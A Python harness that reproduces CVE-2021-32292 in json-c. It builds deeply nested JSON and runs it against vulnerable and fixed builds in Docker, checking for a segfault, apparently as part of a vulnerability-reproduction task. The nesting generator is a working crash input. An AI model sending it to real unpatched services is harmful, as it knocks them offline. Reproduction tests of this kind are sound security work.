#!/usr/bin/env python3
import sys
import subprocess
import json
import argparse
from pathlib import Path

def generate_deep_json(layers, output_path):
    print(f"Generating JSON with {layers} layers...")
    # Iterative construction to avoid Python recursion limit
    prefix = '{"a":' * layers
    suffix = '}' * layers
    content = f'{prefix}"leaf"{suffix}'
    output_path.write_text(content, encoding='utf-8')
    print(f"Saved to {output_path} ({output_path.stat().st_size} bytes)")

def run_container(service, seed_path, repo_root):
    compose_file = repo_root / "tasks" / "CVE-2021-32292_jsonc" / "compose.yml"
    
    cmd = [
        "docker", "compose",
        "-f", str(compose_file),
        "run", "--rm",
        "-v", f"{seed_path.resolve()}:/input/seed.bin:ro",
        service
    ]
    
    print(f"Running {service}...")
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )
    return result

def main():
    parser = argparse.ArgumentParser(description="Manual reproduction of CVE-2021-32292")
    parser.add_argument("layers", type=int, help="Number of nesting layers")
    args = parser.parse_args()

    repo_root = Path(__file__).parent.parent
    seed_path = repo_root / "manual_seed.json"
    
    generate_deep_json(args.layers, seed_path)
    
    print("\n--- TEST: VULNERABLE (0.15) ---")
    vuln_res = run_container("target-vuln", seed_path, repo_root)
    print(f"Exit Code: {vuln_res.returncode}")
    if vuln_res.returncode == 139:
        print("RESULT: CRASH (SIGSEGV) 💥")
    elif vuln_res.returncode == 0:
        print("RESULT: OK (0) ✅")
    else:
        print(f"RESULT: FAIL ({vuln_res.returncode}) ❌")
        print("Stderr:", vuln_res.stderr.strip())

    print("\n--- TEST: FIXED (0.16) ---")
    fixed_res = run_container("target-fixed", seed_path, repo_root)
    print(f"Exit Code: {fixed_res.returncode}")
    if fixed_res.returncode == 139:
        print("RESULT: CRASH (SIGSEGV) 💥 (Unexpected for fixed!)")
    elif fixed_res.returncode == 0:
        print("RESULT: OK (0) ✅")
    elif fixed_res.returncode == 1:
        print("RESULT: HANDLED (1) 🛡️ (Likely depth limit reached)")
        print("Stderr:", fixed_res.stderr.strip())
    else:
        print(f"RESULT: FAIL ({fixed_res.returncode}) ❌")
        print("Stderr:", fixed_res.stderr.strip())

    # Cleanup
    if seed_path.exists():
        seed_path.unlink()

if __name__ == "__main__":
    main()
